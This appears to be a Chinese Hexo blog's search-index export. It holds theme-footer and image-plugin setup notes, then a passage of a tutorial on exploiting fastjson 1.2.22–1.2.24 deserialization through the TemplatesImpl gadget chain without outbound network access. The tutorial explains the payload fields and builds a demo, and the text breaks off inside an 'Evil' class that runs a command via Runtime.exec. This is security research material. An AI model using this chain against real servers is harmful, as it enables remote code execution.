class=\"built_in\">id</span>=<span class=\"string\">&quot;footer&quot;</span>&gt;</span><br><span class=\"line\">    &lt;div class=<span class=\"string\">&quot;footer-left&quot;</span>&gt;</span><br><span class=\"line\">        &lt;%= __(<span class=\"string\">&#x27;footer.copyright&#x27;</span>) %&gt; &amp;copy;</span><br><span class=\"line\">        &lt;% var endYear = (theme.copyright &amp;&amp; theme.copyright.end_year) ? theme.copyright.end_year : new Date().getFullYear() %&gt;</span><br><span class=\"line\">        &lt;% var startYear = (theme.copyright &amp;&amp; theme.copyright.start_year) ? theme.copyright.start_year : new Date().getFullYear() %&gt;</span><br><span class=\"line\">        &lt;%= startYear &gt;= endYear ? endYear : startYear + <span class=\"string\">&quot;-&quot;</span> + endYear %&gt;</span><br><span class=\"line\">        &lt;%= config.author || config.title %&gt;</span><br><span class=\"line\">    &lt;/div&gt;</span><br><span class=\"line\">    &lt;div class=<span class=\"string\">&quot;footer-right&quot;</span>&gt;</span><br><span class=\"line\">        &lt;nav&gt;</span><br><span class=\"line\">            &lt;ul&gt;</span><br><span class=\"line\">                &lt;% <span class=\"keyword\">for</span> (var i <span class=\"keyword\">in</span> theme.nav) &#123; %&gt;&lt;!--</span><br><span class=\"line\">       --&gt;&lt;li&gt;&lt;a href=<span class=\"string\">&quot;&lt;%- url_for(theme.nav[i]) %&gt;&quot;</span>&gt;&lt;%= __(<span class=\"string\">&#x27;nav.&#x27;</span>+i).replace(<span class=\"string\">&quot;nav.&quot;</span>, <span class=\"string\">&quot;&quot;</span>) %&gt;&lt;/a&gt;&lt;/li&gt;&lt;!--</span><br><span class=\"line\">     --&gt;&lt;% &#125; %&gt;</span><br><span class=\"line\">            &lt;/ul&gt;</span><br><span class=\"line\">            &lt;ul&gt;</span><br><span class=\"line\">                &lt;% <span class=\"keyword\">if</span> (theme.busuanzi &amp;&amp; theme.busuanzi.enable)&#123; %&gt;</span><br><span class=\"line\">                    &lt;!-- 不蒜子统计 --&gt;</span><br><span class=\"line\">                    &lt;span <span class=\"built_in\">id</span>=<span class=\"string\">&quot;busuanzi_container_site_pv&quot;</span>&gt;</span><br><span class=\"line\">                  本站总访问量&lt;span <span class=\"built_in\">id</span>=<span class=\"string\">&quot;busuanzi_value_site_pv&quot;</span>&gt;&lt;/span&gt;次</span><br><span class=\"line\">              &lt;/span&gt;</span><br><span class=\"line\">                    &lt;span class=<span class=\"string\">&quot;post-meta-divider&quot;</span>&gt;|&lt;/span&gt;</span><br><span class=\"line\">                    &lt;span <span class=\"built_in\">id</span>=<span class=\"string\">&quot;busuanzi_container_site_uv&quot;</span> style=<span class=\"string\">&#x27;display:none&#x27;</span>&gt;</span><br><span class=\"line\">                      本站访客数&lt;span <span class=\"built_in\">id</span>=<span class=\"string\">&quot;busuanzi_value_site_uv&quot;</span>&gt;&lt;/span&gt;人</span><br><span class=\"line\">              &lt;/span&gt;</span><br><span class=\"line\">                    &lt;script async src=<span class=\"string\">&quot;//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class=\"line\">                &lt;% &#125; %&gt;</span><br><span class=\"line\">            &lt;/ul&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        &lt;/nav&gt;</span><br><span class=\"line\">    &lt;/div&gt;</span><br><span class=\"line\">&lt;/footer&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img src=\"poHJNJtonbsgvvQIBG8E41KtD96hIIGt4BJFaA_zc_4.png\" alt=\"image\"></p>\n<p><img src=\"PsVIGJRySYSQSslwM2YnUpiuRKCqnZ1W7Ly_0xeAZLA.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;ul&gt;</span><br><span class=\"line\">                &lt;% <span class=\"keyword\">if</span> (theme.busuanzi &amp;&amp; theme.busuanzi.enable)&#123; %&gt;</span><br><span class=\"line\">                    &lt;!-- 不蒜子统计 --&gt;</span><br><span class=\"line\">                    &lt;span <span class=\"built_in\">id</span>=<span class=\"string\">&quot;busuanzi_container_site_pv&quot;</span>&gt;</span><br><span class=\"line\">                  本站总访问量&lt;span <span class=\"built_in\">id</span>=<span class=\"string\">&quot;busuanzi_value_site_pv&quot;</span>&gt;&lt;/span&gt;次</span><br><span class=\"line\">              &lt;/span&gt;</span><br><span class=\"line\">                    &lt;script async src=<span class=\"string\">&quot;//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class=\"line\">                &lt;% &#125; %&gt;</span><br><span class=\"line\">            &lt;/ul&gt;</span><br></pre></td></tr></table></figure>\n\n\n<h2 id=\"文章添加图片\"><a href=\"#文章添加图片\" class=\"headerlink\" title=\"文章添加图片\"></a>文章添加图片</h2><h3 id=\"安装插件\"><a href=\"#安装插件\" class=\"headerlink\" title=\"安装插件\"></a>安装插件</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">npm install hexo-asset-image --save</span><br></pre></td></tr></table></figure>\n<h3 id=\"修改-config-yml\"><a href=\"#修改-config-yml\" class=\"headerlink\" title=\"修改_config.yml\"></a>修改_config.yml</h3><p>打开hexo的配置文件_config.yml；找到 post_asset_folder，把这个选项从false改成true</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#加载图片用到</span></span><br><span class=\"line\">post_asset_folder: <span class=\"literal\">true</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"修改index-js\"><a href=\"#修改index-js\" class=\"headerlink\" title=\"修改index.js\"></a>修改index.js</h3><p>文件：</p>\n<figure class=\"highlight plaintext\"><figcaption><span>Text</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">/node_modules/hexo-asset-image/index.js</span><br></pre></td></tr></table></figure>\n<p>修改内容1：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">58</span>行</span><br><span class=\"line\">$(<span class=\"variable language_\">this</span>).<span class=\"title function_\">attr</span>(<span class=\"string\">&#x27;src&#x27;</span>, config.<span class=\"property\">root</span> + link + src);</span><br><span class=\"line\">修改为：</span><br><span class=\"line\">$(<span class=\"variable language_\">this</span>).<span class=\"title function_\">attr</span>(<span class=\"string\">&#x27;src&#x27;</span>,src);</span><br></pre></td></tr></table></figure>\n<p>修改内容2：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">45</span>行</span><br><span class=\"line\">|| <span class=\"regexp\">/^\\s*\\/uploads|images\\//</span>.<span class=\"title function_\">test</span>(src))) &#123;</span><br><span class=\"line\">修改为：</span><br><span class=\"line\">|| <span class=\"regexp\">/^\\s*\\/uploads|images1\\//</span>.<span class=\"title function_\">test</span>(src))) &#123;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>最终代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&#x27;use strict&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> cheerio = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;cheerio&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// http://stackoverflow.com/questions/14480345/how-to-get-the-nth-occurrence-in-a-string</span></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">getPosition</span>(<span class=\"params\">str, m, i</span>) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> str.<span class=\"title function_\">split</span>(m, i).<span class=\"title function_\">join</span>(m).<span class=\"property\">length</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">hexo.<span class=\"property\">extend</span>.<span class=\"property\">filter</span>.<span class=\"title function_\">register</span>(<span class=\"string\">&#x27;after_post_render&#x27;</span>, <span class=\"keyword\">function</span>(<span class=\"params\">data</span>)&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> config = hexo.<span class=\"property\">config</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(config.<span class=\"property\">post_asset_folder</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> link = data.<span class=\"property\">permalink</span>;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> beginPos = <span class=\"title function_\">getPosition</span>(link, <span class=\"string\">&#x27;/&#x27;</span>, <span class=\"number\">3</span>) + <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> appendLink = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">    <span class=\"comment\">// In hexo 3.1.1, the permalink of &quot;about&quot; page is like &quot;.../about/index.html&quot;.</span></span><br><span class=\"line\">    <span class=\"comment\">// if not with index.html endpos = link.lastIndexOf(&#x27;.&#x27;) + 1 support hexo-abbrlink</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"regexp\">/.*\\/index\\.html$/</span>.<span class=\"title function_\">test</span>(link)) &#123;</span><br><span class=\"line\">      <span class=\"comment\">// when permalink is end with index.html, for example 2019/02/20/xxtitle/index.html</span></span><br><span class=\"line\">      <span class=\"comment\">// image in xxtitle/ will go to xxtitle/index/</span></span><br><span class=\"line\">      appendLink = <span class=\"string\">&#x27;index/&#x27;</span>;</span><br><span class=\"line\">      <span class=\"keyword\">var</span> endPos = link.<span class=\"title function_\">lastIndexOf</span>(<span class=\"string\">&#x27;/&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">var</span> endPos = link.<span class=\"title function_\">lastIndexOf</span>(<span class=\"string\">&#x27;.&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    link = link.<span class=\"title function_\">substring</span>(beginPos, endPos) + <span class=\"string\">&#x27;/&#x27;</span> + appendLink;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">var</span> toprocess = [<span class=\"string\">&#x27;excerpt&#x27;</span>, <span class=\"string\">&#x27;more&#x27;</span>, <span class=\"string\">&#x27;content&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; toprocess.<span class=\"property\">length</span>; i++)&#123;</span><br><span class=\"line\">      <span class=\"keyword\">var</span> key = toprocess[i];</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">var</span> $ = cheerio.<span class=\"title function_\">load</span>(data[key], &#123;</span><br><span class=\"line\">        <span class=\"attr\">ignoreWhitespace</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\">        <span class=\"attr\">xmlMode</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\">        <span class=\"attr\">lowerCaseTags</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\">        <span class=\"attr\">decodeEntities</span>: <span class=\"literal\">false</span></span><br><span class=\"line\">      &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">      $(<span class=\"string\">&#x27;img&#x27;</span>).<span class=\"title function_\">each</span>(<span class=\"keyword\">function</span>(<span class=\"params\"></span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ($(<span class=\"variable language_\">this</span>).<span class=\"title function_\">attr</span>(<span class=\"string\">&#x27;src&#x27;</span>))&#123;</span><br><span class=\"line\">          <span class=\"comment\">// For windows style path, we replace &#x27;\\&#x27; to &#x27;/&#x27;.</span></span><br><span class=\"line\">          <span class=\"keyword\">var</span> src = $(<span class=\"variable language_\">this</span>).<span class=\"title function_\">attr</span>(<span class=\"string\">&#x27;src&#x27;</span>).<span class=\"title function_\">replace</span>(<span class=\"string\">&#x27;\\\\&#x27;</span>, <span class=\"string\">&#x27;/&#x27;</span>);</span><br><span class=\"line\">          <span class=\"keyword\">if</span>(!(<span class=\"regexp\">/http[s]*.*|\\/\\/.*/</span>.<span class=\"title function_\">test</span>(src)</span><br><span class=\"line\">            || <span class=\"regexp\">/^\\s+\\//</span>.<span class=\"title function_\">test</span>(src)</span><br><span class=\"line\">            || <span class=\"regexp\">/^\\s*\\/uploads|images1\\//</span>.<span class=\"title function_\">test</span>(src))) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// For &quot;about&quot; page, the first part of &quot;src&quot; can&#x27;t be removed.</span></span><br><span class=\"line\">            <span class=\"comment\">// In addition, to support multi-level local directory.</span></span><br><span class=\"line\">            <span class=\"keyword\">var</span> linkArray = link.<span class=\"title function_\">split</span>(<span class=\"string\">&#x27;/&#x27;</span>).<span class=\"title function_\">filter</span>(<span class=\"keyword\">function</span>(<span class=\"params\">elem</span>)&#123;</span><br><span class=\"line\">              <span class=\"keyword\">return</span> elem != <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">            &#125;);</span><br><span class=\"line\">            <span class=\"keyword\">var</span> srcArray = src.<span class=\"title function_\">split</span>(<span class=\"string\">&#x27;/&#x27;</span>).<span class=\"title function_\">filter</span>(<span class=\"keyword\">function</span>(<span class=\"params\">elem</span>)&#123;</span><br><span class=\"line\">              <span class=\"keyword\">return</span> elem != <span class=\"string\">&#x27;&#x27;</span> &amp;&amp; elem != <span class=\"string\">&#x27;.&#x27;</span>;</span><br><span class=\"line\">            &#125;);</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(srcArray.<span class=\"property\">length</span> &gt; <span class=\"number\">1</span>)</span><br><span class=\"line\">            srcArray.<span class=\"title function_\">shift</span>();</span><br><span class=\"line\">            src = srcArray.<span class=\"title function_\">join</span>(<span class=\"string\">&#x27;/&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">//$(this).attr(&#x27;src&#x27;, config.root + link + src);</span></span><br><span class=\"line\">            $(<span class=\"variable language_\">this</span>).<span class=\"title function_\">attr</span>(<span class=\"string\">&#x27;src&#x27;</span>, src);</span><br><span class=\"line\">            <span class=\"variable language_\">console</span>.<span class=\"title function_\">info</span>(<span class=\"string\">&quot;src：&quot;</span> + src);<span class=\"comment\">//src：Fp7aKq--0PJJ6yD8kdJ6bU6csSL8UPnWsCQKPjaGIv0.png</span></span><br><span class=\"line\">            <span class=\"variable language_\">console</span>.<span class=\"property\">info</span>&amp;&amp;<span class=\"variable language_\">console</span>.<span class=\"title function_\">info</span>(<span class=\"string\">&quot;update link as:--&gt;&quot;</span>+config.<span class=\"property\">root</span> + link + src);</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">          <span class=\"variable language_\">console</span>.<span class=\"property\">info</span>&amp;&amp;<span class=\"variable language_\">console</span>.<span class=\"title function_\">info</span>(<span class=\"string\">&quot;no src attr, skipped...&quot;</span>);</span><br><span class=\"line\">          <span class=\"variable language_\">console</span>.<span class=\"property\">info</span>&amp;&amp;<span class=\"variable language_\">console</span>.<span class=\"title function_\">info</span>($(<span class=\"variable language_\">this</span>));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;);</span><br><span class=\"line\">      data[key] = $.<span class=\"title function_\">html</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n","categories":["Hexo"],"tags":["Hexo"]},{"title":"Fasjson漏洞不出网（本地序列化）","url":"/2022/06/15/Fasjson%E6%BC%8F%E6%B4%9E%E4%B8%8D%E5%87%BA%E7%BD%91%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0%E6%80%BB%E7%BB%93/","content":"<h1 id=\"Fasjson漏洞不出网（本地序列化）\"><a href=\"#Fasjson漏洞不出网（本地序列化）\" class=\"headerlink\" title=\"Fasjson漏洞不出网（本地序列化）\"></a>Fasjson漏洞不出网（本地序列化）</h1><h1 id=\"说明\"><a href=\"#说明\" class=\"headerlink\" title=\"说明\"></a>说明</h1><p>fastjson getshell的时候 需要构造一个恶意类 </p>\n<p>用的 rmi和jdni协议都是要出网的。在内网的情况下如果不出网的情况下就难以利用。</p>\n<h1 id=\"TemplatesImpl\"><a href=\"#TemplatesImpl\" class=\"headerlink\" title=\"TemplatesImpl\"></a>TemplatesImpl</h1><p>这个利用链有限制的。由于该字段在fastjson1.2.22版本引入，所以只能影响1.2.22-1.2.24</p>\n<p>使用条件 </p>\n<p>1. parseObject(input,Object.class,Feature.SupportNonPublicField)</p>\n<p>2. parse(input,Feature.SupportNonPublicField)</p>\n<p>这里解释一下payload的构造：</p>\n<p>@type：当fastjson根据json数据对TemplatesImpl类进行反序列化时，会调用TemplatesImpl类的getOutputProperties方法触发利用链加载_bytecodes属性中的TempletaPoc类字节码并实例化，执行RCE代码。</p>\n<p>_bytecodes：主要是恶意类TempletaPoc的字节码。</p>\n<p>_name：关于_name属性，在调用TemplatesImpl利用链的过程中，会对_name进行不为null的校验，因此_name的值不能为null（具体可参考CC2利用链）</p>\n<p>_tfactory：在调用TemplatesImpl利用链时，defineTransletClasses方法内部会通过_tfactory属性调用一个getExternalExtensionsMap方法，如果_tfactory属性为null则会抛出异常，无法根据_bytecodes属性的内容加载并实例化恶意类</p>\n<p>outputProperties：json数据在反序列化时会调用TemplatesImpl类的getOutputProperties方法触发利用链，可以理解为outputProperties属性的作用就是为了调用getOutputProperties方法。</p>\n<h2 id=\"创建项目\"><a href=\"#创建项目\" class=\"headerlink\" title=\"创建项目\"></a>创建项目</h2><p>创建一个项目</p>\n<p><img src=\"qWyFAFmUw-9zSl7rpetkjDC181oBNuYPTb_yClT8Vu4.png\" alt=\"image\"></p>\n<p>新建立一个类App.java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> garck;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> com.alibaba.fastjson.JSON;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">User</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> String id;</span><br><span class=\"line\"></span><br><span class=\"line\">    User()&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;User go&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setId</span><span class=\"params\">(String ids)</span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;setId go&quot;</span>);</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.id=ids;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">getId</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;GetId go&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>.id;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">toString</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;User&#123;&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;id=&#x27;&quot;</span> + id + <span class=\"string\">&#x27;\\&#x27;&#x27;</span> +</span><br><span class=\"line\">                <span class=\"string\">&#x27;&#125;&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">App</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span>&#123;</span><br><span class=\"line\">        System.out.println(JSON.parse(<span class=\"string\">&quot;&#123;\\&quot;@type\\&quot;:\\&quot;garck.User\\&quot;,\\&quot;id\\&quot;:\\&quot;110\\&quot;&#125;&quot;</span>));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>添加依赖</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;dependencies&gt;</span><br><span class=\"line\">    </span><br><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class=\"line\">    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class=\"line\">    &lt;version&gt;<span class=\"number\">1.2</span><span class=\"number\">.22</span>&lt;/version&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>\n<p>完整的pom.xml</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span> encoding=<span class=\"string\">&quot;UTF-8&quot;</span>?&gt;</span><br><span class=\"line\">&lt;project xmlns=<span class=\"string\">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class=\"line\">         xmlns:xsi=<span class=\"string\">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class=\"line\">         xsi:schemaLocation=<span class=\"string\">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br><span class=\"line\">    &lt;modelVersion&gt;<span class=\"number\">4.0</span><span class=\"number\">.0</span>&lt;/modelVersion&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;groupId&gt;org.example&lt;/groupId&gt;</span><br><span class=\"line\">    &lt;artifactId&gt;fastJsonSecNoNetwork&lt;/artifactId&gt;</span><br><span class=\"line\">    &lt;version&gt;<span class=\"number\">1.0</span>-SNAPSHOT&lt;/version&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;dependencies&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">        &lt;dependency&gt;</span><br><span class=\"line\">            &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class=\"line\">            &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class=\"line\">            &lt;version&gt;<span class=\"number\">1.2</span><span class=\"number\">.22</span>&lt;/version&gt;</span><br><span class=\"line\">        &lt;/dependency&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;/dependencies&gt;</span><br><span class=\"line\">&lt;/project&gt;</span><br></pre></td></tr></table></figure>\n<p>运行</p>\n<p><img src=\"rRsGgenSvYZ8OgD4npe84sYzv1r8YtcNX01JqtZ1pa0.png\" alt=\"image\"></p>\n<p>把方法删掉无法获取值</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> garck;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> com.alibaba.fastjson.JSON;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">User</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> String id;</span><br><span class=\"line\"></span><br><span class=\"line\">    User()&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;User go&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">toString</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;User&#123;&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;id=&#x27;&quot;</span> + id + <span class=\"string\">&#x27;\\&#x27;&#x27;</span> +</span><br><span class=\"line\">                <span class=\"string\">&#x27;&#125;&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">App</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span>&#123;</span><br><span class=\"line\">        System.out.println(JSON.parse(<span class=\"string\">&quot;&#123;\\&quot;@type\\&quot;:\\&quot;garck.User\\&quot;,\\&quot;id\\&quot;:\\&quot;110\\&quot;&#125;&quot;</span>));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>User go</p>\n<p>User{id&#x3D;’null’}</p>\n<p><img src=\"nFqqPi1xJYiAfKaVKUXsVlCcxuk0UMkgJTjxoVSc7d4.png\" alt=\"image\"></p>\n<p>私有变量 加上 Feature.SupportNonPublicField 是可以进行赋值的。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> garck;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> com.alibaba.fastjson.JSON;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">User</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> String id;</span><br><span class=\"line\"></span><br><span class=\"line\">    User()&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;User go&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">toString</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;User&#123;&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;id=&#x27;&quot;</span> + id + <span class=\"string\">&#x27;\\&#x27;&#x27;</span> +</span><br><span class=\"line\">                <span class=\"string\">&#x27;&#125;&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">App</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span>&#123;</span><br><span class=\"line\">        System.out.println(JSON.parse(<span class=\"string\">&quot;&#123;\\&quot;@type\\&quot;:\\&quot;garck.User\\&quot;,\\&quot;id\\&quot;:\\&quot;110\\&quot;&#125;&quot;</span>,Feature.SupportNonPublicField));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>User go</p>\n<p>User{id&#x3D;’110’}</p>\n<p><img src=\"ALTw5wB5dlE5LG3DQ1f58584uDs9X7-z4wu3GJ7lBp0.png\" alt=\"image\"></p>\n<p>是的，就是7U21链里面的TemplatesImplcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</p>\n<p>这个类本身就存在反序列化漏洞，会将成员变量_bytecodes的数据作为类的字节码进行newInsantce操作从而调用其构造方法或static块。故可以fastjson为契机去调用此类。</p>\n<p>但是由于_name 和_bytecodes 是私有属性，所以需要FASTJSON反序列化接口有Feature.SupportNonPublicField参数才能实现，利用条件很苛刻，但是条件允许的话就很方便，payload打过去就完事。</p>\n<p>“_tfactory这个字段在TemplatesImpl既没有get方法也没有set方法，这没关系，我们设置_tfactory为{ },fastjson会调用其无参构造函数得_tfactory对象，这样就解决了某些版本中在defineTransletClasses()用到会引用_tfactory属性导致异常退出。”</p>\n<p>创建Evil类</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> garck;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Evil</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AbstractTranslet</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">static</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            String[] cmd = &#123;<span class=\"string\">&quot;calc&quot;</span>&#125;;</span><br><span class=\"line\">            java.lang.Runtime.getRuntime().exec(cmd).waitFor();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> ( Exception e ) &#123;</span><br><span class=\"line\">            